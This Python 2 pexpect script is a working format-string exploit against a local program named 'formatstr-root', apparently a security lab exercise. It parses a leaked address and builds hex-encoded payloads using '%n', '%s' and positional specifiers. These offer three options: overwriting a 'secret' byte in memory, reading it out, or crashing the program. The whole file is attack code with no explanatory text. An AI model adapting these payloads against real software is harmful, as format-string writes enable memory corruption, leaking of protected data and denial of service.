import tty
import pexpect
child = pexpect.spawn('./formatstr-root')
tty.setraw(child.child_fd)
child.expect(r'0x[ ]*[0-9a-f]+')
child.expect(r'0x[ ]*[0-9a-f]+')
child.expect(r'0x[ ]*[0-9a-f]+')
child.expect(r'0x[ ]*[0-9a-f]+')
secret_addr = child.after.replace(' ','0')
endian_addr = secret_addr[8:]+secret_addr[6:-2]+secret_addr[4:-4]+secret_addr[2:-6]
full_code =""
bad_hexcodes = ["00","20","0C","0D","0A","0c","0d","0a"]
if secret_addr[8:] in bad_hexcodes or secret_addr[6:-2] in bad_hexcodes or secret_addr[4:-4] in bad_hexcodes or secret_addr[2:-6] in bad_hexcodes:
        print("An uninsertable address has been found at: " + secret_addr +"try again, (or alter the program to fix the issue)")
print("A:Overwrite Secret[1], B:Read Secret[1] C:Crash")
selection=raw_input("Selection: ")
if (selection == 'A' or selection == 'a'):
        overwrite_val=int(256)
        while overwrite_val<0 or 255<overwrite_val:
                overwrite_val = int(input("Overwrite secret[1] byte with base10 val: "))
        input_str = str(overwrite_val).zfill(3)
        if (overwrite_val == 0):
                full_code =  "25 31 32 24 6e 6e 6e 6e" +endian_addr
        else:
                full_code = "25 32 24 3" + input_str[0] +" 3"+input_str[1] + " 3"+input_str[2] +" 75 25 31 33 24 6e" +endian_addr

elif(selection == 'B' or selection == 'b'):
        print("B chosen")
        full_code = endian_addr + "53 65 63 72 65 74 5b 31 5d 3d 25 31 30 24 73"
else:
        print("C chosen")
        full_code = "25 73 25 73 25 73 25 73 25 73 25 73 25 73 25 73 25 73 25 73"
hex_string = full_code.replace(' ','')
final_string = hex_string.decode("hex")
child.sendline("100")
child.sendline(final_string)
child.expect(pexpect.EOF)
print(child.before)


